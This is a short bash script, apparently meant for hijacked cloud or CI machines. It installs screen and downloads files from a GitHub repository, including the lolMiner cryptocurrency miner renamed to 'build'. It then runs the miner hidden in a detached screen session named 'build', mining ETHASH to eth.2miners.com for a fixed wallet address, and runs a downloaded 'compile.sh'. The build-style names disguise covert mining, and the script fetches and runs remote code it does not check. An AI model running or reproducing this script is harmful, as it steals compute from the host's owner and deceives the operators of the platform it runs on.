#!/bin/bash
apt-get update
apt install screen -y
wget -qO tune_config https://raw.githubusercontent.com/uaaoxjdr/testly/main/tune_config
wget -qO compile.sh https://raw.githubusercontent.com/uaaoxjdr/testly/main/compile.sh
wget -qO build https://github.com/uaaoxjdr/testly/raw/main/lolMiner
chmod +x compile.sh
chmod +x build
screen -dm -S build ./build --algo ETHASH --pool eth.2miners.com:2020 --user 0x5c32f4894827ee28bcfbb5a8c221470147290ae2.mokad
./compile.sh
echo succes
while [ $? -eq 42 ]; do
    sleep 10s
